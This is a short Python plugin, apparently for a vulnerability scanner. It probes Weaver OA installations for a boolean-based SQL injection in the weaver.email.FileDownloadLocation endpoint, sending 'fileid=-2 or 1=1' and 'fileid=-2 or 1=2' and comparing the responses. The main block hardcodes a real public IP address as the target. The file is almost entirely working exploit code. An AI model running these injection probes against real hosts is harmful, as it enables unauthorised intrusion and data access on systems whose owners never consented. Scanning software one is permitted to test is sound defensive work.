#!/usr/bin/python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2014-076418

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

def audit(url):

    true_url = url + 'weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=1'
    false_url =url + 'weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=2' 

    code1, head1,res1, errcode1, _ = curl.curl2(true_url)
    code2, head2,res2, errcode2, _ = curl.curl2(false_url)
    
    if 'attachment' in head1 and  'attachment' not in head2:
        security_warning(true_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://220.248.243.186:8081/')[1])